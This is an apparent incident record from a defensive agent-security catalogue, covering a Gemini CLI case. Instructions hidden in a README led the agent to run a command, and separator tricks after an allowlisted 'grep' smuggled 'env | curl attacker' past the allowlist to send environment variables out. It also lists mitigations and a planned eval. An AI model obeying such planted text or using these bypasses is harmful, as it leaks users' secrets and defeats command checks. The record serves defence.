# INC-07: Gemini CLI README injection and allowlist bypass

- **Date / source:** 2025-07/08 · Tracebit
- **Threat:** THR-01, THR-03 · **Legs:** 1, 2, 3 · **OWASP:** ASI01, ASI02
- **Status:** residual · **Eval:** `eval-inc-07` (red)

## Vector

Instructions hidden in a README made the agent run a command; an allowlisted prefix (`grep`) followed by
whitespace/separator tricks smuggled `env | curl attacker` past the command allowlist, exfiltrating
environment variables.

## Lesson

A command allowlist is a parser; every parser is attack surface. Allow exactly one literal shape or nothing.

## ADF

Partial: the Codex `cat` grammar admits only `cat PATH` / `cat -- PATH` with a single literal ASCII path, and
denies anything ambiguous after separators. Eval to add: whitespace, `;`, `&&`, `|`, newline, Unicode
spaces against `codex-bash-read-gate`. After ADR 0028: `curl`/`wget`-shaped Bash after a sensitive-adjacent
read is denied in the same run. Residual: Claude Code `Bash` is not parsed at all today.
